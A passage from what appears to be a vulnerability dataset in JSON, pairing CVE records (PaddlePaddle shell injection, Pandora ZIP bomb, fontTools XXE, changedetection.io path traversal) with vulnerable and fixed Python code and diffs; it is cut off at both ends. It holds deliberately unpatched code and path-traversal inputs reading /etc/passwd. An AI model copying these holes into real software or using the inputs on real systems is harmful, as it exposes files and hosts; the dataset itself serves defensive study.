        "commit": "bdf6234",
        "file_path": "python/paddle/base/framework.py",
        "start_line": 5655,
        "end_line": 5662,
        "snippet": "        def _convert_to_pdf(dot_file_path):\n            pdf_save_path = os.path.splitext(dot_file_path)[0] + '.pdf'\n            exited_code = subprocess.call(\n                ['dot', '-Tpdf', dot_file_path, '-o', pdf_save_path]\n            )\n            if exited_code != 0:\n                print('The dot command is needed for creating pdf files.')\n                print(f'The {dot_file_path} is saved as the dot filetype.')"
      }
    ],
    "vul_patch": "--- a/python/paddle/base/framework.py\n+++ b/python/paddle/base/framework.py\n@@ -1,8 +1,7 @@\n         def _convert_to_pdf(dot_file_path):\n             pdf_save_path = os.path.splitext(dot_file_path)[0] + '.pdf'\n             exited_code = subprocess.call(\n-                'dot -Tpdf ' + dot_file_path + ' -o ' + pdf_save_path,\n-                shell=True,\n+                ['dot', '-Tpdf', dot_file_path, '-o', pdf_save_path]\n             )\n             if exited_code != 0:\n                 print('The dot command is needed for creating pdf files.')\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-22898",
    "cve_description": "workers/extractor.py in Pandora (aka pandora-analysis/pandora) 1.3.0 allows a denial of service when an attacker submits a deeply nested ZIP archive (aka ZIP bomb).",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/pandora-analysis/pandora",
    "patch_url": [
      "https://github.com/pandora-analysis/pandora/commit/1dc06327fdc07c56eae653e497dd137ec70d8265"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_244_1",
        "commit": "38a7195",
        "file_path": "pandora/workers/extractor.py",
        "start_line": 497,
        "end_line": 613,
        "snippet": "    def analyse(self, task: Task, report: Report, manual_trigger: bool=False):\n        # The files supported by dfvfs generally don't have proper mime types, so we just try it on everything.\n        dfvfs_info = self.check_dfvfs(task.file, True)\n        if not (task.file.is_archive or task.file.is_eml or task.file.is_msg or dfvfs_info):\n            report.status = Status.NOTAPPLICABLE\n            return\n\n        if not task.user:\n            raise PandoraException('The task user is missing. Should not happen, but investigate if it does.')\n\n        pandora = Pandora()\n\n        tasks: List[Task] = []\n        extracted_dir = task.file.directory / 'extracted'\n        safe_create_dir(extracted_dir)\n        extracted: Sequence[Union[Path, Tuple[str, BytesIO]]] = []\n\n        # Try to extract files from archive\n        # TODO: Support other archive formats\n        if task.file.is_archive:\n            if task.password:\n                self.passwords = [task.password]\n            else:\n                self.passwords = self.zip_passwords\n            try:\n                if task.file.mime_type == \"application/x-7z-compressed\":\n                    extracted = self._extract_7z(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/vnd.ms-cab-compressed\":\n                    extracted = self._extract_cab(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-rar\":\n                    extracted = self._extract_rar(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-bzip2\":\n                    extracted = self._extract_bz2(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/gzip\":\n                    extracted = self._extract_gz(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-tar\":\n                    extracted = self._extract_tar(task.file, report, extracted_dir)\n                elif task.file.mime_type in [\"application/x-lzma\", \"application/x-xz\", \"application/x-lzip\"]:\n                    extracted = self._extract_lzma(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-iso9660-image\":\n                    extracted = self._extract_iso(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/zip\":\n                    extracted = self._extract_zip(task.file, report, extracted_dir)\n                    if not extracted:\n                        report.clear_extras()\n                        report.clear_details()\n                        report.reset_status()\n                        extracted = self._extract_zip(task.file, report, extracted_dir, pyzipper.AESZipFile)\n                else:\n                    raise PandoraException(f'Unsupported mimetype: {task.file.mime_type}')\n            except BaseException as e:\n                report.status = Status.WARN\n                report.add_details('Warning', f'Unable to extract {task.file.path.name}: {e}.')\n                report.add_extra('no_password', True)\n                extracted = []\n                self.logger.exception(e)\n\n        # Try to extract attachments from EML file\n        if task.file.is_eml:\n            if not task.file.eml_data or 'attachment' not in task.file.eml_data or not task.file.eml_data['attachment']:\n                report.status = Status.NOTAPPLICABLE\n            else:\n                try:\n                    extracted = self.extract_eml(task.file.eml_data)\n                except Exception as e:\n                    self.logger.exception(e)\n\n        elif task.file.is_msg:\n            if not task.file.msg_data or not task.file.msg_data.attachments:\n                report.status = Status.NOTAPPLICABLE\n            else:\n                try:\n                    extracted = self.extract_msg(task.file.msg_data)\n                except Exception as e:\n                    self.logger.exception(e)\n\n        elif dfvfs_info:\n            # this is a dfvfs supported file\n            try:\n                extracted = self.extract_with_dfvfs(task.file, report)\n            except Exception as e:\n                self.logger.exception('dfVFS dislikes it.')\n                report.status = Status.WARN\n                report.add_details('Warning', f'Unable to process with dfVFS {task.file.path.name}: {e}.')\n\n        if not extracted and report.status != Status.NOTAPPLICABLE:\n            report.status = Status.WARN\n            report.add_details('Warning', 'Nothing to extract.')\n\n        for ef in extracted:\n            if isinstance(ef, Path):\n                filename = ef.name\n                with ef.open('rb') as f:\n                    sample = BytesIO(f.read())\n            else:\n                filename, sample = ef\n            new_task = Task.new_task(user=task.user, sample=sample,\n                                     filename=filename,\n                                     disabled_workers=task.disabled_workers,\n                                     parent=task)\n            pandora.add_extracted_reference(task, new_task)\n            pandora.enqueue_task(new_task)\n            tasks.append(new_task)\n\n        shutil.rmtree(extracted_dir)\n        # wait for all the tasks to finish\n        while not all(t.workers_done for t in tasks):\n            time.sleep(1)\n\n        if tasks:\n            report.status = max(t.status for t in tasks)\n            if report.status > Status.CLEAN:\n                report.add_details('Warning', 'There are suspicious files in this archive, click on the \"Extracted\" tab for more.')\n        elif not report.status == Status.NOTAPPLICABLE:\n            # Nothing was extracted\n            report.status = Status.WARN\n            report.add_details('Warning', 'Looks like the archive is empty (?). This is suspicious.')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_244_1",
        "commit": "1dc0632",
        "file_path": "pandora/workers/extractor.py",
        "start_line": 497,
        "end_line": 639,
        "snippet": "    def analyse(self, task: Task, report: Report, manual_trigger: bool=False):\n        # The files supported by dfvfs generally don't have proper mime types, so we just try it on everything.\n        dfvfs_info = self.check_dfvfs(task.file, True)\n        if not (task.file.is_archive or task.file.is_eml or task.file.is_msg or dfvfs_info):\n            report.status = Status.NOTAPPLICABLE\n            return\n\n        # Check if we reach the max recursivity (archive in archive in archive...)\n        _curtask = task\n        _cur_recurse = self.max_recurse\n        _cur_max_files_in_recurse = self.max_files_in_recursive_archive\n        while _cur_recurse > 0 and _cur_max_files_in_recurse > 0:\n            if not _curtask.parent:\n                break\n            _curtask = _curtask.parent\n            _cur_recurse -= 1\n            _cur_max_files_in_recurse -= len(_curtask.extracted)\n\n        if _cur_recurse <= 0:\n            self.logger.warning(f'File {task.file.path.name} is too deep in the recursion chain (>{self.max_recurse}).')\n            report.status = Status.ERROR if self.max_is_error else Status.ALERT\n            report.add_details('Warning', f'File {task.file.path.name} is too deep in the recursion chain (>{self.max_recurse}). If you want to scan it anyway, click on Actions > Rescan file.')\n            return\n\n        if _cur_max_files_in_recurse <= 0:\n            self.logger.warning(f'File {task.file.path.name} cannot be extracted, too many files (>{self.max_files_in_recursive_archive}) in the recursive archive.')\n            report.status = Status.ERROR if self.max_is_error else Status.ALERT\n            report.add_details('Warning', f'File {task.file.path.name} cannot be extracted, too many files (>{self.max_files_in_recursive_archive}) in the recursive archive. If you want to scan it anyway, click on Actions > Rescan file.')\n            return\n\n        if not task.user:\n            raise PandoraException('The task user is missing. Should not happen, but investigate if it does.')\n\n        pandora = Pandora()\n\n        tasks: List[Task] = []\n        extracted_dir = task.file.directory / 'extracted'\n        safe_create_dir(extracted_dir)\n        extracted: Sequence[Union[Path, Tuple[str, BytesIO]]] = []\n\n        # Try to extract files from archive\n        # TODO: Support other archive formats\n        if task.file.is_archive:\n            if task.password:\n                self.passwords = [task.password]\n            else:\n                self.passwords = self.zip_passwords\n            try:\n                if task.file.mime_type == \"application/x-7z-compressed\":\n                    extracted = self._extract_7z(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/vnd.ms-cab-compressed\":\n                    extracted = self._extract_cab(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-rar\":\n                    extracted = self._extract_rar(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-bzip2\":\n                    extracted = self._extract_bz2(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/gzip\":\n                    extracted = self._extract_gz(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-tar\":\n                    extracted = self._extract_tar(task.file, report, extracted_dir)\n                elif task.file.mime_type in [\"application/x-lzma\", \"application/x-xz\", \"application/x-lzip\"]:\n                    extracted = self._extract_lzma(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/x-iso9660-image\":\n                    extracted = self._extract_iso(task.file, report, extracted_dir)\n                elif task.file.mime_type == \"application/zip\":\n                    extracted = self._extract_zip(task.file, report, extracted_dir)\n                    if not extracted:\n                        report.clear_extras()\n                        report.clear_details()\n                        report.reset_status()\n                        extracted = self._extract_zip(task.file, report, extracted_dir, pyzipper.AESZipFile)\n                else:\n                    raise PandoraException(f'Unsupported mimetype: {task.file.mime_type}')\n            except BaseException as e:\n                report.status = Status.WARN\n                report.add_details('Warning', f'Unable to extract {task.file.path.name}: {e}.')\n                report.add_extra('no_password', True)\n                extracted = []\n                self.logger.exception(e)\n\n        # Try to extract attachments from EML file\n        if task.file.is_eml:\n            if not task.file.eml_data or 'attachment' not in task.file.eml_data or not task.file.eml_data['attachment']:\n                report.status = Status.NOTAPPLICABLE\n            else:\n                try:\n                    extracted = self.extract_eml(task.file.eml_data)\n                except Exception as e:\n                    self.logger.exception(e)\n\n        elif task.file.is_msg:\n            if not task.file.msg_data or not task.file.msg_data.attachments:\n                report.status = Status.NOTAPPLICABLE\n            else:\n                try:\n                    extracted = self.extract_msg(task.file.msg_data)\n                except Exception as e:\n                    self.logger.exception(e)\n\n        elif dfvfs_info:\n            # this is a dfvfs supported file\n            try:\n                extracted = self.extract_with_dfvfs(task.file, report)\n            except Exception as e:\n                self.logger.exception('dfVFS dislikes it.')\n                report.status = Status.WARN\n                report.add_details('Warning', f'Unable to process with dfVFS {task.file.path.name}: {e}.')\n\n        if not extracted and report.status != Status.NOTAPPLICABLE:\n            report.status = Status.WARN\n            report.add_details('Warning', 'Nothing to extract.')\n\n        for ef in extracted:\n            if isinstance(ef, Path):\n                filename = ef.name\n                with ef.open('rb') as f:\n                    sample = BytesIO(f.read())\n            else:\n                filename, sample = ef\n            new_task = Task.new_task(user=task.user, sample=sample,\n                                     filename=filename,\n                                     disabled_workers=task.disabled_workers,\n                                     parent=task)\n            pandora.add_extracted_reference(task, new_task)\n            pandora.enqueue_task(new_task)\n            tasks.append(new_task)\n\n        shutil.rmtree(extracted_dir)\n\n        if not tasks and not report.status == Status.NOTAPPLICABLE:\n            # Nothing was extracted\n            report.status = Status.WARN\n            report.add_details('Warning', 'Looks like the archive is empty (?). This is suspicious.')\n        elif report.status not in [Status.ERROR, Status.WARN, Status.ALERT, Status.OVERWRITE]:\n            # wait for all the workers to finish, or have one of them raising an ALERT\n            while not all(t.workers_done for t in tasks):\n                for t in tasks:\n                    # If any of the task is marked as ALERT or OVERWRITE, we can quit.\n                    if t.workers_done and t.status >= Status.ALERT:\n                        report.add_details('Warning', 'There are suspicious files in this archive, click on the \"Extracted\" tab for more.')\n                        break\n                time.sleep(1)\n            report.status = max(t.status for t in tasks if t.workers_done)"
      }
    ],
    "vul_patch": "--- a/pandora/workers/extractor.py\n+++ b/pandora/workers/extractor.py\n@@ -3,6 +3,29 @@\n         dfvfs_info = self.check_dfvfs(task.file, True)\n         if not (task.file.is_archive or task.file.is_eml or task.file.is_msg or dfvfs_info):\n             report.status = Status.NOTAPPLICABLE\n+            return\n+\n+        # Check if we reach the max recursivity (archive in archive in archive...)\n+        _curtask = task\n+        _cur_recurse = self.max_recurse\n+        _cur_max_files_in_recurse = self.max_files_in_recursive_archive\n+        while _cur_recurse > 0 and _cur_max_files_in_recurse > 0:\n+            if not _curtask.parent:\n+                break\n+            _curtask = _curtask.parent\n+            _cur_recurse -= 1\n+            _cur_max_files_in_recurse -= len(_curtask.extracted)\n+\n+        if _cur_recurse <= 0:\n+            self.logger.warning(f'File {task.file.path.name} is too deep in the recursion chain (>{self.max_recurse}).')\n+            report.status = Status.ERROR if self.max_is_error else Status.ALERT\n+            report.add_details('Warning', f'File {task.file.path.name} is too deep in the recursion chain (>{self.max_recurse}). If you want to scan it anyway, click on Actions > Rescan file.')\n+            return\n+\n+        if _cur_max_files_in_recurse <= 0:\n+            self.logger.warning(f'File {task.file.path.name} cannot be extracted, too many files (>{self.max_files_in_recursive_archive}) in the recursive archive.')\n+            report.status = Status.ERROR if self.max_is_error else Status.ALERT\n+            report.add_details('Warning', f'File {task.file.path.name} cannot be extracted, too many files (>{self.max_files_in_recursive_archive}) in the recursive archive. If you want to scan it anyway, click on Actions > Rescan file.')\n             return\n \n         if not task.user:\n@@ -103,15 +126,18 @@\n             tasks.append(new_task)\n \n         shutil.rmtree(extracted_dir)\n-        # wait for all the tasks to finish\n-        while not all(t.workers_done for t in tasks):\n-            time.sleep(1)\n \n-        if tasks:\n-            report.status = max(t.status for t in tasks)\n-            if report.status > Status.CLEAN:\n-                report.add_details('Warning', 'There are suspicious files in this archive, click on the \"Extracted\" tab for more.')\n-        elif not report.status == Status.NOTAPPLICABLE:\n+        if not tasks and not report.status == Status.NOTAPPLICABLE:\n             # Nothing was extracted\n             report.status = Status.WARN\n             report.add_details('Warning', 'Looks like the archive is empty (?). This is suspicious.')\n+        elif report.status not in [Status.ERROR, Status.WARN, Status.ALERT, Status.OVERWRITE]:\n+            # wait for all the workers to finish, or have one of them raising an ALERT\n+            while not all(t.workers_done for t in tasks):\n+                for t in tasks:\n+                    # If any of the task is marked as ALERT or OVERWRITE, we can quit.\n+                    if t.workers_done and t.status >= Status.ALERT:\n+                        report.add_details('Warning', 'There are suspicious files in this archive, click on the \"Extracted\" tab for more.')\n+                        break\n+                time.sleep(1)\n+            report.status = max(t.status for t in tasks if t.workers_done)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-45139",
    "cve_description": "fontTools is a library for manipulating fonts, written in Python. The subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed. This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system. This vulnerability has been patched in version 4.43.0.",
    "cwe_info": {
      "CWE-611": {
        "name": "Improper Restriction of XML External Entity Reference",
        "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
      }
    },
    "repo": "https://github.com/fonttools/fonttools",
    "patch_url": [
      "https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_283_1",
        "commit": "74240af",
        "file_path": "Lib/fontTools/subset/svg.py",
        "start_line": 194,
        "end_line": 251,
        "snippet": "def subset_glyphs(self, s) -> bool:\n    if etree is None:\n        raise ImportError(\"No module named 'lxml', required to subset SVG\")\n\n    # glyph names (before subsetting)\n    glyph_order: List[str] = s.orig_glyph_order\n    # map from glyph names to original glyph indices\n    rev_orig_glyph_map: Dict[str, int] = s.reverseOrigGlyphMap\n    # map from original to new glyph indices (after subsetting)\n    glyph_index_map: Dict[int, int] = s.glyph_index_map\n\n    new_docs: List[SVGDocument] = []\n    for doc in self.docList:\n\n        glyphs = {\n            glyph_order[i] for i in range(doc.startGlyphID, doc.endGlyphID + 1)\n        }.intersection(s.glyphs)\n        if not glyphs:\n            # no intersection: we can drop the whole record\n            continue\n\n        svg = etree.fromstring(\n            # encode because fromstring dislikes xml encoding decl if input is str.\n            # SVG xml encoding must be utf-8 as per OT spec.\n            doc.data.encode(\"utf-8\"),\n            parser=etree.XMLParser(\n                # Disable libxml2 security restrictions to support very deep trees.\n                # Without this we would get an error like this:\n                # `lxml.etree.XMLSyntaxError: internal error: Huge input lookup`\n                # when parsing big fonts e.g. noto-emoji-picosvg.ttf.\n                huge_tree=True,\n                # ignore blank text as it's not meaningful in OT-SVG; it also prevents\n                # dangling tail text after removing an element when pretty_print=True\n                remove_blank_text=True,\n            ),\n        )\n\n        elements = group_elements_by_id(svg)\n        gids = {rev_orig_glyph_map[g] for g in glyphs}\n        element_ids = {f\"glyph{i}\" for i in gids}\n        closure_element_ids(elements, element_ids)\n\n        if not subset_elements(svg, element_ids):\n            continue\n\n        if not s.options.retain_gids:\n            id_map = remap_glyph_ids(svg, glyph_index_map)\n            update_glyph_href_links(svg, id_map)\n\n        new_doc = etree.tostring(svg, pretty_print=s.options.pretty_svg).decode(\"utf-8\")\n\n        new_gids = (glyph_index_map[i] for i in gids)\n        for start, end in ranges(new_gids):\n            new_docs.append(SVGDocument(new_doc, start, end, doc.compressed))\n\n    self.docList = new_docs\n\n    return bool(self.docList)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_283_1",
        "commit": "9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c",
        "file_path": "Lib/fontTools/subset/svg.py",
        "start_line": 194,
        "end_line": 254,
        "snippet": "def subset_glyphs(self, s) -> bool:\n    if etree is None:\n        raise ImportError(\"No module named 'lxml', required to subset SVG\")\n\n    # glyph names (before subsetting)\n    glyph_order: List[str] = s.orig_glyph_order\n    # map from glyph names to original glyph indices\n    rev_orig_glyph_map: Dict[str, int] = s.reverseOrigGlyphMap\n    # map from original to new glyph indices (after subsetting)\n    glyph_index_map: Dict[int, int] = s.glyph_index_map\n\n    new_docs: List[SVGDocument] = []\n    for doc in self.docList:\n\n        glyphs = {\n            glyph_order[i] for i in range(doc.startGlyphID, doc.endGlyphID + 1)\n        }.intersection(s.glyphs)\n        if not glyphs:\n            # no intersection: we can drop the whole record\n            continue\n\n        svg = etree.fromstring(\n            # encode because fromstring dislikes xml encoding decl if input is str.\n            # SVG xml encoding must be utf-8 as per OT spec.\n            doc.data.encode(\"utf-8\"),\n            parser=etree.XMLParser(\n                # Disable libxml2 security restrictions to support very deep trees.\n                # Without this we would get an error like this:\n                # `lxml.etree.XMLSyntaxError: internal error: Huge input lookup`\n                # when parsing big fonts e.g. noto-emoji-picosvg.ttf.\n                huge_tree=True,\n                # ignore blank text as it's not meaningful in OT-SVG; it also prevents\n                # dangling tail text after removing an element when pretty_print=True\n                remove_blank_text=True,\n                # don't replace entities; we don't expect any in OT-SVG and they may\n                # aboused for XXE attacks\n                resolve_entities=False,\n            ),\n        )\n\n        elements = group_elements_by_id(svg)\n        gids = {rev_orig_glyph_map[g] for g in glyphs}\n        element_ids = {f\"glyph{i}\" for i in gids}\n        closure_element_ids(elements, element_ids)\n\n        if not subset_elements(svg, element_ids):\n            continue\n\n        if not s.options.retain_gids:\n            id_map = remap_glyph_ids(svg, glyph_index_map)\n            update_glyph_href_links(svg, id_map)\n\n        new_doc = etree.tostring(svg, pretty_print=s.options.pretty_svg).decode(\"utf-8\")\n\n        new_gids = (glyph_index_map[i] for i in gids)\n        for start, end in ranges(new_gids):\n            new_docs.append(SVGDocument(new_doc, start, end, doc.compressed))\n\n    self.docList = new_docs\n\n    return bool(self.docList)"
      }
    ],
    "vul_patch": "--- a/Lib/fontTools/subset/svg.py\n+++ b/Lib/fontTools/subset/svg.py\n@@ -32,6 +32,9 @@\n                 # ignore blank text as it's not meaningful in OT-SVG; it also prevents\n                 # dangling tail text after removing an element when pretty_print=True\n                 remove_blank_text=True,\n+                # don't replace entities; we don't expect any in OT-SVG and they may\n+                # aboused for XXE attacks\n+                resolve_entities=False,\n             ),\n         )\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-56509",
    "cve_description": "changedetection.io is a free open source web page change detection, website watcher, restock monitor and notification service. Improper input validation in the application can allow attackers to perform local file read (LFR) or path traversal attacks. These vulnerabilities occur when user input is used to construct file paths without adequate sanitization or validation. For example, using file:../../../etc/passwd or file: ///etc/passwd can bypass weak validations and allow unauthorized access to sensitive files. Even though this has been addressed in previous patch, it is still insufficient. This vulnerability is fixed in 0.48.05.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/dgtlmoon/changedetection.io",
    "patch_url": [
      "https://github.com/dgtlmoon/changedetection.io/commit/f7e9846c9b40a229813d19cdb66bf60fbe5e6a2a",
      "https://github.com/dgtlmoon/changedetection.io/commit/4419bc0e61d0b03c588bd573a3602bbcfd953671"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_81_1",
        "commit": "5dea5e1",
        "file_path": "changedetectionio/processors/__init__.py",
        "start_line": "30",
        "end_line": "164",
        "snippet": "    def call_browser(self, preferred_proxy_id=None):\n\n        from requests.structures import CaseInsensitiveDict\n\n        url = self.watch.link\n\n        # Protect against file://, file:/ access, check the real \"link\" without any meta \"source:\" etc prepended.\n        if re.search(r'^file:/', url.strip(), re.IGNORECASE):\n            if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                raise Exception(\n                    \"file:// type access is denied for security reasons.\"\n                )\n\n        # Requests, playwright, other browser via wss:// etc, fetch_extra_something\n        prefer_fetch_backend = self.watch.get('fetch_backend', 'system')\n\n        # Proxy ID \"key\"\n        preferred_proxy_id = preferred_proxy_id if preferred_proxy_id else self.datastore.get_preferred_proxy_for_watch(uuid=self.watch.get('uuid'))\n\n        # Pluggable content self.fetcher\n        if not prefer_fetch_backend or prefer_fetch_backend == 'system':\n            prefer_fetch_backend = self.datastore.data['settings']['application'].get('fetch_backend')\n\n        # In the case that the preferred fetcher was a browser config with custom connection URL..\n        # @todo - on save watch, if its extra_browser_ then it should be obvious it will use playwright (like if its requests now..)\n        custom_browser_connection_url = None\n        if prefer_fetch_backend.startswith('extra_browser_'):\n            (t, key) = prefer_fetch_backend.split('extra_browser_')\n            connection = list(\n                filter(lambda s: (s['browser_name'] == key), self.datastore.data['settings']['requests'].get('extra_browsers', [])))\n            if connection:\n                prefer_fetch_backend = 'html_webdriver'\n                custom_browser_connection_url = connection[0].get('browser_connection_url')\n\n        # PDF should be html_requests because playwright will serve it up (so far) in a embedded page\n        # @todo https://github.com/dgtlmoon/changedetection.io/issues/2019\n        # @todo needs test to or a fix\n        if self.watch.is_pdf:\n           prefer_fetch_backend = \"html_requests\"\n\n        # Grab the right kind of 'fetcher', (playwright, requests, etc)\n        from changedetectionio import content_fetchers\n        if hasattr(content_fetchers, prefer_fetch_backend):\n            # @todo TEMPORARY HACK - SWITCH BACK TO PLAYWRIGHT FOR BROWSERSTEPS\n            if prefer_fetch_backend == 'html_webdriver' and self.watch.has_browser_steps:\n                # This is never supported in selenium anyway\n                logger.warning(\"Using playwright fetcher override for possible puppeteer request in browsersteps, because puppetteer:browser steps is incomplete.\")\n                from changedetectionio.content_fetchers.playwright import fetcher as playwright_fetcher\n                fetcher_obj = playwright_fetcher\n            else:\n                fetcher_obj = getattr(content_fetchers, prefer_fetch_backend)\n        else:\n            # What it referenced doesnt exist, Just use a default\n            fetcher_obj = getattr(content_fetchers, \"html_requests\")\n\n        proxy_url = None\n        if preferred_proxy_id:\n            # Custom browser endpoints should NOT have a proxy added\n            if not prefer_fetch_backend.startswith('extra_browser_'):\n                proxy_url = self.datastore.proxy_list.get(preferred_proxy_id).get('url')\n                logger.debug(f\"Selected proxy key '{preferred_proxy_id}' as proxy URL '{proxy_url}' for {url}\")\n            else:\n                logger.debug(f\"Skipping adding proxy data when custom Browser endpoint is specified. \")\n\n        # Now call the fetcher (playwright/requests/etc) with arguments that only a fetcher would need.\n        # When browser_connection_url is None, it method should default to working out whats the best defaults (os env vars etc)\n        self.fetcher = fetcher_obj(proxy_override=proxy_url,\n                                   custom_browser_connection_url=custom_browser_connection_url\n                                   )\n\n        if self.watch.has_browser_steps:\n            self.fetcher.browser_steps = self.watch.get('browser_steps', [])\n            self.fetcher.browser_steps_screenshot_path = os.path.join(self.datastore.datastore_path, self.watch.get('uuid'))\n\n        # Tweak the base config with the per-watch ones\n        from changedetectionio.safe_jinja import render as jinja_render\n        request_headers = CaseInsensitiveDict()\n\n        ua = self.datastore.data['settings']['requests'].get('default_ua')\n        if ua and ua.get(prefer_fetch_backend):\n            request_headers.update({'User-Agent': ua.get(prefer_fetch_backend)})\n\n        request_headers.update(self.watch.get('headers', {}))\n        request_headers.update(self.datastore.get_all_base_headers())\n        request_headers.update(self.datastore.get_all_headers_in_textfile_for_watch(uuid=self.watch.get('uuid')))\n\n        # https://github.com/psf/requests/issues/4525\n        # Requests doesnt yet support brotli encoding, so don't put 'br' here, be totally sure that the user cannot\n        # do this by accident.\n        if 'Accept-Encoding' in request_headers and \"br\" in request_headers['Accept-Encoding']:\n            request_headers['Accept-Encoding'] = request_headers['Accept-Encoding'].replace(', br', '')\n\n        for header_name in request_headers:\n            request_headers.update({header_name: jinja_render(template_str=request_headers.get(header_name))})\n\n        timeout = self.datastore.data['settings']['requests'].get('timeout')\n\n        request_body = self.watch.get('body')\n        if request_body:\n            request_body = jinja_render(template_str=self.watch.get('body'))\n        \n        request_method = self.watch.get('method')\n        ignore_status_codes = self.watch.get('ignore_status_codes', False)\n\n        # Configurable per-watch or global extra delay before extracting text (for webDriver types)\n        system_webdriver_delay = self.datastore.data['settings']['application'].get('webdriver_delay', None)\n        if self.watch.get('webdriver_delay'):\n            self.fetcher.render_extract_delay = self.watch.get('webdriver_delay')\n        elif system_webdriver_delay is not None:\n            self.fetcher.render_extract_delay = system_webdriver_delay\n\n        if self.watch.get('webdriver_js_execute_code') is not None and self.watch.get('webdriver_js_execute_code').strip():\n            self.fetcher.webdriver_js_execute_code = self.watch.get('webdriver_js_execute_code')\n\n        # Requests for PDF's, images etc should be passwd the is_binary flag\n        is_binary = self.watch.is_pdf\n\n        # And here we go! call the right browser with browser-specific settings\n        empty_pages_are_a_change = self.datastore.data['settings']['application'].get('empty_pages_are_a_change', False)\n\n        self.fetcher.run(url=url,\n                         timeout=timeout,\n                         request_headers=request_headers,\n                         request_body=request_body,\n                         request_method=request_method,\n                         ignore_status_codes=ignore_status_codes,\n                         current_include_filters=self.watch.get('include_filters'),\n                         is_binary=is_binary,\n                         empty_pages_are_a_change=empty_pages_are_a_change\n                         )\n\n        #@todo .quit here could go on close object, so we can run JS if change-detected\n        self.fetcher.quit()\n\n        # After init, call run_changedetection() which will do the actual change-detection"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_81_1",
        "commit": "f7e9846",
        "file_path": "changedetectionio/processors/__init__.py",
        "start_line": "30",
        "end_line": "164",
        "snippet": "    def call_browser(self, preferred_proxy_id=None):\n\n        from requests.structures import CaseInsensitiveDict\n\n        url = self.watch.link\n\n        # Protect against file:, file:/, file:// access, check the real \"link\" without any meta \"source:\" etc prepended.\n        if re.search(r'^file:', url.strip(), re.IGNORECASE):\n            if not strtobool(os.getenv('ALLOW_FILE_URI', 'false')):\n                raise Exception(\n                    \"file:// type access is denied for security reasons.\"\n                )\n\n        # Requests, playwright, other browser via wss:// etc, fetch_extra_something\n        prefer_fetch_backend = self.watch.get('fetch_backend', 'system')\n\n        # Proxy ID \"key\"\n        preferred_proxy_id = preferred_proxy_id if preferred_proxy_id else self.datastore.get_preferred_proxy_for_watch(uuid=self.watch.get('uuid'))\n\n        # Pluggable content self.fetcher\n        if not prefer_fetch_backend or prefer_fetch_backend == 'system':\n            prefer_fetch_backend = self.datastore.data['settings']['application'].get('fetch_backend')\n\n        # In the case that the preferred fetcher was a browser config with custom connection URL..\n        # @todo - on save watch, if its extra_browser_ then it should be obvious it will use playwright (like if its requests now..)\n        custom_browser_connection_url = None\n        if prefer_fetch_backend.startswith('extra_browser_'):\n            (t, key) = prefer_fetch_backend.split('extra_browser_')\n            connection = list(\n                filter(lambda s: (s['browser_name'] == key), self.datastore.data['settings']['requests'].get('extra_browsers', [])))\n            if connection:\n                prefer_fetch_backend = 'html_webdriver'\n                custom_browser_connection_url = connection[0].get('browser_connection_url')\n\n        # PDF should be html_requests because playwright will serve it up (so far) in a embedded page\n        # @todo https://github.com/dgtlmoon/changedetection.io/issues/2019\n        # @todo needs test to or a fix\n        if self.watch.is_pdf:\n           prefer_fetch_backend = \"html_requests\"\n\n        # Grab the right kind of 'fetcher', (playwright, requests, etc)\n        from changedetectionio import content_fetchers\n        if hasattr(content_fetchers, prefer_fetch_backend):\n            # @todo TEMPORARY HACK - SWITCH BACK TO PLAYWRIGHT FOR BROWSERSTEPS\n            if prefer_fetch_backend == 'html_webdriver' and self.watch.has_browser_steps:\n                # This is never supported in selenium anyway\n                logger.warning(\"Using playwright fetcher override for possible puppeteer request in browsersteps, because puppetteer:browser steps is incomplete.\")\n                from changedetectionio.content_fetchers.playwright import fetcher as playwright_fetcher\n                fetcher_obj = playwright_fetcher\n            else:\n                fetcher_obj = getattr(content_fetchers, prefer_fetch_backend)\n        else:\n            # What it referenced doesnt exist, Just use a default\n            fetcher_obj = getattr(content_fetchers, \"html_requests\")\n\n        proxy_url = None\n        if 